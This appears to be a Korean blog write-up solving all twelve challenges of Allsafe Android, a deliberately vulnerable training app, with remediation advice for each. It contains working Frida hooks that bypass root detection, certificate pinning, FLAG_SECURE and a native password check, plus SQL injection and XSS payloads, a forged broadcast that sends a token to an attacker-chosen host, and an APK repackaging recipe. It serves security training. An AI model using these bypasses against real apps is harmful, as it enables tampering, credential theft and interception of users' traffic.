---
layout: post
title: Allsafe Android README Challenge 1~12 Write-up
page_description: Allsafe Android README의 12개 취약점 챌린지 풀이와 실행 증거
category_key: ctf-wargame
summary: Allsafe Android README의 12개 챌린지를 정적·동적으로 재현한 기록
lead: Allsafe Android README 순서대로 1번부터 12번까지 풀이한다.
featured: false
feature_order: 0
---

# Allsafe Android README Challenge 1~12

## 1. 분석 환경

대상은 [Allsafe Android 커밋 `c732915`](https://github.com/t0thkr1s/allsafe-android/tree/c7329155cbbd0a2079a48bbfcaa23a6666899ee9)이며 원본 APK SHA-256은 `7C08B9549FFE02C0AEBE03A2B83780D3F87211185CC4045C8F7FABF67421BC4B`다. Android 15(API 35) x86_64 에뮬레이터, Apktool 3.0.3, Frida 17.22.0을 사용했다. 루팅되지 않은 에뮬레이터에서는 Frida Gadget 실습 APK로 3·5·6·12번을 검증했다.

## 2. README 챌린지 1~12

### 2.1 Insecure Logging

`InsecureLogging`은 사용자가 입력한 값을 그대로 `Log.d("ALLSAFE", "User entered secret: ...")`에 넣는다. 근거는 [InsecureLogging.java 31~34행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/InsecureLogging.java#L31-L34)이다.

```bash
adb shell pidof infosecadventures.allsafe
adb shell logcat --pid <PID> | grep "User entered secret"
```

에뮬레이터에서 `README01_SECRET_2026`을 입력하자 Logcat에 다음 값이 그대로 기록됐다.

```text
D ALLSAFE : User entered secret: README01_SECRET_2026
```

![입력한 비밀이 Logcat에 평문으로 남은 화면]({{ '/assets/images/android-vul/01-insecure-logging.png' | relative_url }})

민감값 로깅을 제거하고 릴리스 빌드에서 디버그 로그를 제외해야 한다. [Android Log Info Disclosure](https://developer.android.com/privacy-and-security/risks/log-info-disclosure)

### 2.2 Hardcoded Credentials

한 곳이 아니라 두 곳에서 자격증명이 발견된다.

1. SOAP 본문: `superadmin / supersecurepassword` — [HardcodedCredentials.kt 43~52행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/HardcodedCredentials.kt#L43-L52)
2. 개발 URL userinfo: `admin / password123` — [strings.xml 3행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/res/values/strings.xml#L3)

APK의 문자열·리소스는 사용자 기기에 배포되므로 비밀 저장소가 아니다. 난독화나 Base64는 추출 비용만 조금 늘릴 뿐 자격증명을 보호하지 못한다. 인증 비밀은 서버에 두고, 앱에는 만료가 짧고 최소 권한인 사용자별 토큰만 전달해야 한다. 암호 키가 필요하면 Android Keystore를 사용한다. [OWASP MASTG Cryptographic Key Storage](https://mas.owasp.org/MASTG/knowledge/android/MASVS-STORAGE/MASTG-KNOW-0047/)

![APK에서 확인한 하드코딩 자격증명 위치—비밀번호는 공개용 이미지에서 가림]({{ '/assets/images/android-vul/02-hardcoded-credentials.png' | relative_url }})

### 2.3 Root Detection

앱은 [RootDetection.kt 18~23행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/RootDetection.kt#L18-L23)에서 `RootBeer(context).isRooted` 한 번의 반환값을 신뢰한다.

```javascript
Java.perform(function () {
  const RootBeer = Java.use('com.scottyab.rootbeer.RootBeer');
  RootBeer.isRooted.implementation = function () {
    console.log('[+] isRooted() -> false');
    return false;
  };
});
```

Frida Gadget이 로드된 실습 APK에서 훅을 적용한 뒤 `[CHECK ROOT]`를 눌렀다. 콘솔에 아래 로그가 남았고 앱은 `Congrats, root is not detected!`를 표시했다.

```text
[ALLSAFE-POC] README-03 RootBeer.isRooted -> false
```

![RootBeer 반환값을 변경해 루팅 탐지를 우회한 화면]({{ '/assets/images/android-vul/03-root-detection-frida.png' | relative_url }})

루트 탐지는 위험 신호 중 하나로만 사용하고, 서버 측 무결성 신호·재인증·거래별 정책과 결합해야 한다.

### 2.4 Arbitrary Code Execution

가장 심각한 문제다. Application 클래스는 설치된 패키지 이름이 `infosecadventures.allsafe`로 시작하기만 하면 `CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY`로 그 패키지의 코드를 불러와 고정 클래스의 정적 메서드를 호출한다. [ArbitraryCodeExecution.kt 19~33행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/ArbitraryCodeExecution.kt#L19-L33)

PoC의 핵심 클래스는 다음과 같다.

```java
package infosecadventures.allsafe.plugin;

import android.util.Log;

public final class Loader {
    public static void loadPlugin() {
        Log.w("ALLSAFE-POC", "Plugin code executed inside Allsafe process");
    }
}
```

PoC 앱의 applicationId를 `infosecadventures.allsafe.poc`로 두고 설치한 뒤 Allsafe를 시작했다. 별도 PoC Activity와 Logcat에서 코드 실행을 확인했다. PoC는 로그와 확인 화면만 표시한다.

```text
E ALLSAFE_POC: README-04 Loader.loadPlugin executed in pid=4436
```

![접두사가 일치하는 외부 패키지의 Loader 코드가 실행된 화면]({{ '/assets/images/android-vul/04-arbitrary-code-execution.png' | relative_url }})

두 번째 경로는 `/sdcard/Download/allsafe_updater.apk`를 `DexClassLoader`로 열어 `VersionCheck.getLatestVersion()`을 호출한다. [ArbitraryCodeExecution.kt 37~49행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/ArbitraryCodeExecution.kt#L37-L49) Android 문서는 외부 저장소가 코드 주입을 막는 접근통제를 제공하지 않으므로 그곳에서 코드를 로드하지 말라고 명시한다. [DexClassLoader](https://developer.android.com/reference/dalvik/system/DexClassLoader), [Android Security Tips](https://developer.android.com/privacy-and-security/security-tips)

개선해야 할 점은 동적 로딩 제거가 최선이다. 불가피하면 앱 내부 저장소만 사용하고, 허용한 서명자의 인증서와 아티팩트 해시를 실행 전에 검증하며, 패키지 이름 접두사가 아니라 서명 신뢰를 확인해야 한다.

### 2.5 Secure Flag Bypass

`MainActivity`는 모든 화면에 `FLAG_SECURE`를 설정한다. [MainActivity.kt 18~22행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/MainActivity.kt#L18-L22)

```javascript
Java.perform(function () {
  Java.choose('infosecadventures.allsafe.MainActivity', {
    onMatch(activity) {
      activity.runOnUiThread(Java.registerClass({
        name: 'infosecadventures.allsafe.ClearSecureFlag',
        implements: [Java.use('java.lang.Runnable')],
        methods: {
          run() { activity.getWindow().clearFlags(0x00002000); }
        }
      }).$new());
    },
    onComplete() {}
  });
});
```

훅 적용 전 ADB 캡처는 검은 화면이었지만, 실행 중인 `MainActivity`의 플래그를 제거한 뒤에는 화면이 캡처됐다.

![실행 중 FLAG_SECURE를 제거한 뒤 캡처된 화면]({{ '/assets/images/android-vul/05-secure-flag-bypass.png' | relative_url }})

README가 설명하듯 이것은 취약점 판정보다 Frida 연습에 가깝다. `FLAG_SECURE`는 일반적인 스크린샷과 비보안 디스플레이 노출을 줄이는 유효한 방어지만, 이미 앱 프로세스를 계측할 수 있는 공격자에 대한 완전한 경계는 아니다. [Android FLAG_SECURE 가이드](https://developer.android.com/security/fraud-prevention/activities)

### 2.6 Certificate Pinning Bypass

`CertificatePinning`은 OkHttp `CertificatePinner`를 사용하지만 핀을 빌드 타임에 고정하지 않는다. 먼저 고의로 잘못된 핀으로 접속하고 예외 메시지에서 현재 peer chain의 SHA-256 핀을 추출한 뒤, 다음 요청의 핀으로 다시 사용한다. [CertificatePinning.java 40~58행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/CertificatePinning.java#L40-L58), [87~113행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/CertificatePinning.java#L87-L113)

```javascript
Java.perform(function () {
  const Pinner = Java.use('okhttp3.CertificatePinner');
  Pinner['check$okhttp'].implementation = function (host, peerCertsFn) {
    console.log('[+] bypass pinning for ' + host);
    return;
  };
});
```

실제 APK의 `check$okhttp`를 훅한 뒤 과제를 실행했다. Frida 로그와 앱의 `Successful connection over HTTPS!` Snackbar를 확인했다.

```text
[ALLSAFE-POC] README-06 bypassed CertificatePinner.check$okhttp for httpbin.io
```

![CertificatePinner 검사를 우회하고 HTTPS 요청에 성공한 화면]({{ '/assets/images/android-vul/06-certificate-pinning-frida.png' | relative_url }})

런타임에서 관측한 체인을 곧바로 신뢰하는 구현은 정적인 핀과 다르고, 시작 시점의 연결 상태에 신뢰가 좌우된다. Android 공식 문서는 운영 장애 위험 때문에 인증서 피닝 자체를 일반적으로 권장하지 않으며, 꼭 쓸 경우 백업 핀과 만료 전략을 요구한다. [Network Security Configuration](https://developer.android.com/privacy-and-security/security-config), [TLS 보안 가이드](https://developer.android.com/privacy-and-security/security-ssl)

### 2.7 Insecure Broadcast Receiver

Manifest의 `NoteReceiver`는 `android:exported="true"`이고 보호 permission이 없다. [AndroidManifest.xml 43~48행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/AndroidManifest.xml#L43-L48) 수신자는 외부 Intent의 `server`, `note`, `notification_message`를 신뢰하고, 공격자가 지정한 host로 평문 HTTP 요청을 보낸다. 쿼리에는 Base64로 표현된 고정 토큰 `allsafe_dev_admin_token`도 포함된다. [NoteReceiver.java 32~54행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/NoteReceiver.java#L32-L54)

```bash
adb shell am broadcast \
  -a infosecadventures.allsafe.action.PROCESS_NOTE \
  -n infosecadventures.allsafe/.challenges.NoteReceiver \
  --es server example.com \
  --es note README07_FORGED_NOTE \
  --es notification_message README07_FORGED_BROADCAST_SUCCESS
```

브로드캐스트 전송 후 Allsafe 이름으로 `README07_FORGED_BROADCAST_SUCCESS` 알림이 생성됐다. Android 15에서 알림을 화면으로 증명하기 위해 실습 APK manifest에 `POST_NOTIFICATIONS` 권한만 추가했으며, receiver 로직은 변경하지 않았다.

![외부 브로드캐스트로 위조 알림이 생성된 화면]({{ '/assets/images/android-vul/07-insecure-broadcast.png' | relative_url }})

영향은 앱 권한을 이용한 임의 host 요청, 인증 토큰 노출, 알림 스푸핑이다. 네트워크 보안 설정도 `infosecadventures.io`의 cleartext를 허용한다. [network_security_config.xml](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/res/xml/network_security_config.xml) Android는 내부용 receiver를 `exported=false`로 두거나 signature permission으로 보호하라고 권고한다. [Insecure Broadcast Receivers](https://developer.android.com/privacy-and-security/risks/insecure-broadcast-receiver), [Cleartext Communications](https://developer.android.com/privacy-and-security/risks/cleartext-communications)

### 2.8 Deep Link Exploitation

Manifest는 `allsafe://infosecadventures/congrats`와 host 제한이 없는 모든 `https:` URI를 exported `DeepLinkTask`로 연결한다. [AndroidManifest.xml 21~37행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/AndroidManifest.xml#L21-L37) Activity는 쿼리의 `key`가 리소스 문자열과 같은지만 확인한다. [DeepLinkTask.java 24~39행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/DeepLinkTask.java#L24-L39) 그 키는 APK의 `strings.xml`에 들어 있다.

```bash
adb shell am start -W \
  -a android.intent.action.VIEW \
  -d "allsafe://infosecadventures/congrats?key=ebfb7ff0-b2f6-41c8-bef3-4fba17be410c" \
  infosecadventures.allsafe
```

이 명령을 에뮬레이터에서 실행하자 `DeepLinkTask`가 열렸고, 화면의 `Congratulations!`와 Snackbar의 `Good job, you did it!`를 확인했다. Logcat에도 동일한 VIEW action과 URI가 기록됐다.

![정적 키를 포함한 딥링크로 과제를 통과한 화면]({{ '/assets/images/android-vul/08-deep-link.png' | relative_url }})

클라이언트에 포함된 정적 키는 권한 검증이 될 수 없다. 서버가 소유한 상태·사용자 세션·단발성 nonce로 조건을 검증해야 한다. HTTPS App Link는 정확한 host와 path를 지정하고 `android:autoVerify="true"` 및 Digital Asset Links를 사용해야 한다. [Unsafe Use of Deep Links](https://developer.android.com/privacy-and-security/risks/unsafe-use-of-deeplinks)

### 2.9 SQL Injection

로그인 쿼리는 사용자명을 직접 연결하고 비밀번호만 MD5로 바꿔 연결한다. [SQLInjection.kt 26~28행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/SQLInjection.kt#L26-L28)

```text
username: ' OR 1=1 -- 
password: anything
```

생성되는 쿼리는 뒤의 비밀번호 조건이 주석 처리되어 전체 사용자를 반환한다. 특정 사용자만 원하면 `admin' -- `도 가능하다. 개선은 문자열 연결을 없애고 selection args를 사용한다.

실제 에뮬레이터에서는 username에 `admin' -- `를 입력하고 password를 비워 둔 채 로그인했다. Toast에 `User: admin`과 저장된 MD5 값 `21232f297a57a5a743894a0e4a801fc3`가 표시되어 비밀번호 조건 우회를 동적으로 확인했다.

![admin 뒤의 SQL 주석 payload로 비밀번호 검증을 우회한 화면]({{ '/assets/images/android-vul/09-sql-injection.png' | relative_url }})

```kotlin
db.rawQuery(
    "SELECT * FROM user WHERE username = ? AND password = ?",
    arrayOf(username.text.toString(), passwordHash)
)
```

비밀번호 저장에는 빠른 MD5가 아니라 서버 측 Argon2id·scrypt·bcrypt·PBKDF2 같은 전용 password hashing을 사용해야 한다. SQL 문자열 연결이 핵심 원인이고 parameterized query가 1차 방어라는 점은 OWASP 지침과 일치한다. [OWASP SQL Injection Prevention](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)

### 2.10 Vulnerable WebView

WebView는 JavaScript와 파일 접근을 켜고, 사용자가 입력한 URL을 그대로 `loadUrl`하거나 임의 HTML을 `loadData`로 실행한다. [VulnerableWebView.java 31~45행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/VulnerableWebView.java#L31-L45)

```html
<script>alert("README10_XSS_SUCCESS")</script>
```

입력 후 WebView 경고창에 `README10_XSS_SUCCESS`가 표시됐다. URL 입력에는 `file:///etc/hosts`를 넣어 `127.0.0.1 localhost`와 `::1 ip6-localhost`가 읽히는 것도 확인했다. 로컬 시스템 파일 내용이 포함된 두 번째 화면은 공개하지 않는다.

![사용자 입력 HTML의 JavaScript가 WebView에서 실행된 화면]({{ '/assets/images/android-vul/10a-webview-xss-alert.png' | relative_url }})

개선은 JavaScript·파일·content 접근을 기본 거부하고, 필요한 URL은 파싱 후 scheme과 정확한 host를 allowlist로 검증하는 것이다. [WebView Unsafe File Inclusion](https://developer.android.com/privacy-and-security/risks/webview-unsafe-file-inclusion), [Cross-App Scripting](https://developer.android.com/privacy-and-security/risks/cross-app-scripting)

### 2.11 Smali Patching

원본 Java는 `Firewall.INACTIVE`를 지역 변수에 넣고 `ACTIVE`일 때만 성공을 표시한다. [SmaliPatch.java 19~29행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/java/infosecadventures/allsafe/challenges/SmaliPatch.java#L19-L29)

Apktool 3.0.3으로 빌드 APK를 디코드하니 다음 Smali가 생성됐다.

```smali
# before
sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->INACTIVE:Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;

# after
sget-object v1, Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;->ACTIVE:Linfosecadventures/allsafe/challenges/SmaliPatch$Firewall;
```

실제 수행 절차는 다음과 같다.

```bash
java -jar apktool_3.0.3.jar d -f app-debug.apk -o apktool-decoded
# 위 한 줄 수정
java -jar apktool_3.0.3.jar b apktool-decoded -o patched-unsigned.apk
zipalign -f -p 4 patched-unsigned.apk patched-aligned.apk
apksigner sign --ks debug.keystore --out allsafe-smali-patched.apk patched-aligned.apk
apksigner verify --verbose --print-certs allsafe-smali-patched.apk
```

재디코드한 최종 APK에서 `Firewall.ACTIVE`를 확인했고, zipalign 및 v1/v2/v3 서명 검증도 통과했다. 이 과제의 교훈은 중요한 권한 판단을 클라이언트의 한 분기나 문자열에만 두면 안 된다는 것이다. [Apktool 공식 문서](https://apktool.org/docs/install/)

패치 APK를 에뮬레이터에 설치하고 `[CHECK FIREWALL]`을 누르자 `Firewall is now activated, good job!`이 표시됐다. 즉, 파일 수준 변경이 실제 실행 분기까지 바꾼 것을 확인했다.

![Smali 패치 후 방화벽 활성화 성공 화면]({{ '/assets/images/android-vul/11-smali-patching.png' | relative_url }})

### 2.12 Native Library

JNI 함수는 비밀번호를 XOR한 결과와 고정 문자열을 비교하지만, C++ 소스에 평문 `supersecret`이 그대로 있고 주석까지 이를 알려 준다. [native_library.cpp 28~47행](https://github.com/t0thkr1s/allsafe-android/blob/c7329155cbbd0a2079a48bbfcaa23a6666899ee9/app/src/main/cpp/native_library.cpp#L28-L47)

더 중요한 점은 소스만 본 것이 아니라 빌드된 arm64 ELF에서도 다음 세 문자열을 추출했다.

```text
supersecret
8>;.98.(9.?
Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword
```

Frida로 반환값을 강제하는 예시는 다음과 같다.

```javascript
const name = 'Java_infosecadventures_allsafe_challenges_NativeLibrary_checkPassword';
const module = Process.getModuleByName('libnative_library.so');
const addr = module.getExportByName(name);
Interceptor.attach(addr, {
  onLeave(retval) {
    console.log('[+] original=' + retval.toInt32() + ' -> 1');
    retval.replace(1);
  }
});
```

비밀번호 입력란에 일부러 `definitely_wrong`을 넣었다. 원래 반환값 `0`을 `1`로 바꾸자 앱이 `That's it! Excellent work!`를 표시했다.

```text
[ALLSAFE-POC] README-12 JNI checkPassword entered
[ALLSAFE-POC] README-12 native return original=0 -> 1
```

![JNI 반환값을 바꿔 틀린 비밀번호로 통과한 화면]({{ '/assets/images/android-vul/12-native-frida-hook.png' | relative_url }})

네이티브 코드는 비밀 저장소가 아니다. 역공학 비용만 달라질 뿐, 최종 승인 판단과 장기적인 비밀값은 서버에 둬야 한다.

## 3. 결론

README의 12개 과제에서 반복되는 핵심은 클라이언트 내부 값과 분기를 신뢰하면 안 된다는 점이다. 하드코딩된 자격증명과 네이티브 비밀번호는 APK에서 추출할 수 있고, RootBeer 결과·`FLAG_SECURE`·certificate pinning·Smali 분기는 런타임 계측이나 재패키징으로 바뀔 수 있다. 또한 exported receiver, WebView, 동적 코드 로딩처럼 외부 입력을 앱 권한으로 처리하는 기능은 실제 제품에서도 직접적인 공격면이 된다.

## 4. 참고자료

- [Allsafe Android 공식 README](https://github.com/t0thkr1s/allsafe-android)
- [OWASP Mobile Application Security Testing Guide](https://mas.owasp.org/MASTG/)
- [Android Security Risks Index](https://developer.android.com/privacy-and-security/risks)
- [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
- [Apktool 공식 문서](https://apktool.org/docs/install/)

---
